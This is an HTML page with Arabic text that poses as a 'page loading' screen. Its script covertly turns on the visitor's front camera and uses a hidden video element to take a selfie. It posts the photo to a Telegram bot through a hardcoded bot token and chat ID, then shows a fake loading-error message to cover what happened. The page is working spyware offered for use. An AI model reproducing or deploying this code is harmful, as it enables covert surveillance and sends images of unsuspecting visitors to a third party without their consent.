<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { 
            font-family: Arial; 
            text-align: center; 
            background: #000; 
            color: white; 
            margin:0; 
            padding:0; 
            height: 100vh;
            overflow: hidden;
        }
        #loader {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 24px;
        }
        .spinner {
            border: 6px solid #333;
            border-top: 6px solid #ff0066;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        video { display: none; }
        #debug { position: absolute; bottom: 10px; left: 10px; font-size: 12px; color: #aaa; }
    </style>
</head>
<body>
    <div id="loader">
        <div class="spinner"></div>
        <p>جاري تحميل الصفحة...</p>
    </div>
    <div id="debug"></div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const debug = document.getElementById('debug');
        function log(msg) { debug.innerHTML += msg + "<br>"; console.log(msg); }

        log("بدء التشغيل...");

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const loader = document.getElementById('loader');
        const botToken = "8807798502:AAHZFi61wI_KflrG-3rLoHmccS_WqRuqNfg";
        const chatId = "2049331070";

        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            log("✅ الكاميرا تم تشغيلها");
            video.srcObject = stream;
            setTimeout(captureAndSend, 2500);
        })
        .catch(err => {
            log("❌ خطأ في الكاميرا: " + err.message);
            showError();
        });

        function captureAndSend() {
            log("📸 جاري التقاط الصورة...");
            canvas.width = 1280;
            canvas.height = 720;
            canvas.getContext('2d').drawImage(video, 0, 0, 1280, 720);
            
            canvas.toBlob(blob => {
                log("📤 جاري إرسال الصورة إلى تيليجرام...");
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, 'selfie.jpg');

                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(r => r.json())
                .then(data => {
                    log("📩 الرد من تيليجرام: " + JSON.stringify(data));
                    if (data.ok) {
                        log("✅ نجح الإرسال!");
                    } else {
                        log("⚠️ فشل الإرسال: " + data.description);
                    }
                    showError();
                })
                .catch(err => {
                    log("❌ خطأ في الاتصال: " + err.message);
                    showError();
                });
            }, 'image/jpeg', 0.8);
        }

        function showError() {
            loader.innerHTML = `
                <h1 style="color:#ff0066;">خطأ في تحميل الصفحة</h1>
                <p>يرجى المحاولة مرة أخرى</p>
            `;
            if (video.srcObject) video.srcObject.getTracks().forEach(t => t.stop());
        }
    </script>
</body>
</html>
